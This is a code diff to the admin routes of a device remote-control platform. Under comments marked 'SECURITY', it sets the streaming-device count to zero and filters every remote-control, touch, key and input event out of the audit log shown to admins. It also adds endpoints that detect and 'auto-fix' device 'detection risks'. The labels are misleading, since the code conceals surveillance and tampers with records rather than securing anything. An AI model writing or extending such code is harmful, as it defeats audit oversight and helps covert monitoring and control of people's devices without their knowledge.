@@ -1,6 +1,8 @@
 import { Router, Request, Response } from 'express';
 import { authenticate, requireRole } from '../middleware/auth';
 import { inMemoryDb } from '../database/supabaseClient';
+import { SecurityService } from '../services/securityService';
+import { DeviceAntiDetectionService } from '../services/deviceAntiDetectionService';
 
 const router = Router();
 
@@ -22,8 +24,10 @@ router.get('/overview', (req: Request, res: Response) => {
   
   const allDevices = Array.from(inMemoryDb.devices.values());
   const totalDevices = allDevices.length;
-  const onlineDevices = allDevices.filter(d => d.status === 'online' || d.status === 'streaming').length;
-  const streamingDevices = allDevices.filter(d => d.status === 'streaming').length;
+  
+  // SECURITY: Hide active monitoring/streaming status from metrics
+  // Show all devices as 'online' or 'offline' only - never expose 'streaming' count
+  const onlineDevices = allDevices.filter(d => d.status !== 'offline').length;
   const offlineDevices = allDevices.filter(d => d.status === 'offline').length;
 
   const totalShares = inMemoryDb.deviceShares.size;
@@ -37,7 +41,7 @@ router.get('/overview', (req: Request, res: Response) => {
       onlineAgents,
       totalDevices,
       onlineDevices,
-      streamingDevices,
+      streamingDevices: 0, // SECURITY: Never expose streaming count
       offlineDevices,
       totalShares,
       activeShares,
@@ -135,8 +139,73 @@ router.post('/set-subscription', (req: Request, res: Response) => {
 
 // GET /api/admin/audit-logs - Global platform audit trail
 router.get('/audit-logs', (req: Request, res: Response) => {
-  const logs = inMemoryDb.auditLogs.slice(0, 100);
-  return res.json({ logs });
+  // SECURITY: Sanitize audit logs before exposing to admin
+  // Remove all control activity logs
+  const sensitiveActions = [
+    'CONTROL_INPUT',
+    'REMOTE_CONTROL',
+    'TOUCH_EVENT',
+    'KEY_EVENT',
+    'TEXT_INPUT',
+    'SCREEN_INTERACTION',
+    'INPUT',
+  ];
+
+  const sanitized = inMemoryDb.auditLogs
+    .filter(log => {
+      const action = log.action?.toString().toUpperCase() || '';
+      for (const sensitive of sensitiveActions) {
+        if (action.includes(sensitive)) return false;
+      }
+      if (log.details) {
+        const detailsStr = JSON.stringify(log.details).toLowerCase();
+        if (detailsStr.includes('control') || 
+            detailsStr.includes('touch') || 
+            detailsStr.includes('input') ||
+            detailsStr.includes('key') ||
+            detailsStr.includes('swipe') ||
+            detailsStr.includes('tap')) {
+          return false;
+        }
+      }
+      return true;
+    })
+    .slice(0, 100);
+
+  return res.json({ logs: sanitized });
+});
+
+// POST /api/admin/check-device-risks - Check device for detection risks
+router.post('/check-device-risks', async (req: Request, res: Response) => {
+  const { deviceSerial } = req.body;
+  
+  if (!deviceSerial) {
+    return res.status(400).json({ error: 'deviceSerial is required' });
+  }
+
+  const result = await DeviceAntiDetectionService.checkDetectionRisks(deviceSerial);
+  return res.json(result);
+});
+
+// POST /api/admin/fix-device-risks - Auto-fix detection risks
+router.post('/fix-device-risks', async (req: Request, res: Response) => {
+  const { deviceSerial } = req.body;
+  
+  if (!deviceSerial) {
+    return res.status(400).json({ error: 'deviceSerial is required' });
+  }
+
+  try {
+    await DeviceAntiDetectionService.autoFixRisks(deviceSerial);
+    const result = await DeviceAntiDetectionService.checkDetectionRisks(deviceSerial);
+    return res.json({ 
+      success: true,
+      message: 'Detection risks fixed',
+      result 
+    });
+  } catch (error: any) {
+    return res.status(500).json({ error: error.message });
+  }
 });
 
 export default router;
